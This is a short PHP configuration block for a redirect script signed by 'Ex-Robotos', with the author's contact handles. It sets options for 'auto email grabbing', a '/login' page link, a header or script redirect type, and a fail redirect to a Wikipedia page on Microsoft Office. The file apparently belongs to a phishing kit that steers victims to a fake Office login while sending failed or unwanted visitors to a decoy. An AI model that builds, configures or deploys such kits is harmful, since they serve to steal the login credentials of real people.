<?php
/* 

New redirect 2019 v2 by Ex-Robotos

Email: ex.robotos@gmail.com

Facebook: facebook.com/Ex.Robotos

ICQ: @745771262
*/
$autoEmail="true";//"true":Auto email grabing "false":without auto email grabing
$pagelink="/login";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="1";// 1:header - 2:script
?>